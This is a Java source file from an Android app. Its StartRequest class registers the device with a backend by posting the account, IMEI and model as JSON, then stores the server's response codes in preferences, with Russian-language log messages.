package com.inet.android.request;

import java.io.IOException;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.widget.Toast;

import com.inet.android.bs.Caller;
import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.db.RequestWithDataBase;
import com.inet.android.info.GetInfo;
import com.inet.android.utils.DialogShower;
import com.inet.android.utils.Logging;

/**
 * Start request class
 * 
 * @author johny homicide
 * 
 */
public class StartRequest extends DefaultRequest {
	private final String LOG_TAG = "StartRequest";
	private int type = 1;
	static RequestDataBaseHelper db;
	Context ctx;
	SharedPreferences sp;

	public StartRequest(Context ctx) {
		super(ctx);
		this.ctx = ctx;
		sp = PreferenceManager
				.getDefaultSharedPreferences(ctx);
		sp.registerOnSharedPreferenceChangeListener(prefListener);
	}
	
	SharedPreferences.OnSharedPreferenceChangeListener prefListener = 
	        new SharedPreferences.OnSharedPreferenceChangeListener() {
	    public void onSharedPreferenceChanged(SharedPreferences prefs,
	            String key) {
	    	Logging.doLog(LOG_TAG, "prefs make");
	        if (key.equals("account")) {
	        	Logging.doLog(LOG_TAG, prefs.getString("account", "-1"));
	        	if (prefs.getString("account", "account").equals("account")) { 
	        		Logging.doLog(LOG_TAG, "prefs make: account");
	        		Toast.makeText(ctx, "Account number incorrect!", 
	        				Toast.LENGTH_LONG).show();
	        		Intent intent = new Intent("android.intent.action.MAIN");
	        		intent.setClass(ctx, DialogShower.class);
	        		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	        		intent.putExtra("text", "Hello!");
	        		ctx.startActivity(intent);
	        	} else {
		        	JSONObject jsonObject = new JSONObject();
					try {
						jsonObject.put("account", sp.getString("account", "account"));
						jsonObject.put("imei", sp.getString("imei", "imei"));
						jsonObject.put("model", sp.getString("model", "0000"));
					} catch (JSONException e) {
						e.printStackTrace();
					}

					String str = jsonObject.toString();
					StartRequest sr = new StartRequest(ctx);
					sr.sendRequest(str);
		        }
	        } 
	    }
	};

	@Override
	public void sendRequest(String str) {
		RequestTask srt = new RequestTask();
		srt.execute(str);
	}

	class RequestTask extends AsyncTask<String, Void, Void> {
		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}
	}

	@Override
	protected void sendPostRequest(String postRequest) {
		String str = null;
		try {
			Logging.doLog(LOG_TAG, postRequest, postRequest);

			str = Caller.doMake(postRequest, "initial/", ctx);
		} catch (IOException e) {
			e.printStackTrace();
			db = new RequestDataBaseHelper(ctx);
			
			if (db.getExistType(type)) {
				Logging.doLog(LOG_TAG, "запись стартового запроса в базу",
						"запись стартового запроса в базу");
				db.addRequest(new RequestWithDataBase(postRequest, type));
			}
		}
		if (str != null) {
			getRequestData(str);
		} else {
			Logging.doLog(LOG_TAG,
					"ответа от сервера нет или статус ответа плох",
					"ответа от сервера нет или статус ответа плох");
		}
	}

	@Override
	protected void getRequestData(String string) {
		Logging.doLog(LOG_TAG, "getResponseData: " + string,
				"getResponseData: " + string);

		Editor ed = sp.edit();

		JSONObject jsonObject = null;
		try {
			jsonObject = new JSONObject(string);
		} catch (JSONException e) {
			if (string == null) {
				Logging.doLog(LOG_TAG, "json null", "json null");
			}
			return;
		}

		String str = null;
		try {
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			e.printStackTrace();
		}
		if (str != null) {
			ed.putString("code", str);
		} else {
			ed.putString("code", "code");
		}

		if (str.equals("1")) {
			sp.unregisterOnSharedPreferenceChangeListener(prefListener);
			try {
				str = jsonObject.getString("device");
			} catch (JSONException e) {
				e.printStackTrace();
			}
			if (str != null) {
				ed.putString("device", str);
				ed.commit();
//				GetInfo getInfo = new GetInfo(ctx);
//				getInfo.getInfo();
			} else {
				ed.putString("device", "device");
			}
		}

		if (str.equals("0")) {
			try {
				str = jsonObject.getString("error");
			} catch (JSONException e) {
				str = null;
			}
			if (str != null) {
				ed.putString("error", str);
			} else {
				ed.putString("error", "error");
			}
			if (str.equals("0")) {
				Logging.doLog(LOG_TAG, "account не найден", "account не найден");
				
				ed.putString("account", "account");
			}
			if (str.equals("1")) {
				Logging.doLog(LOG_TAG,
						"imei отсутствует или имеет неверный формат",
						"imei отсутствует или имеет неверный формат");
				
				sp.unregisterOnSharedPreferenceChangeListener(prefListener);
			}
			if (str.equals("2"))
				Logging.doLog(LOG_TAG, "устройство с указанным imei уже есть",
						"устройство с указанным imei уже есть");
		}

		ed.commit();
	}
}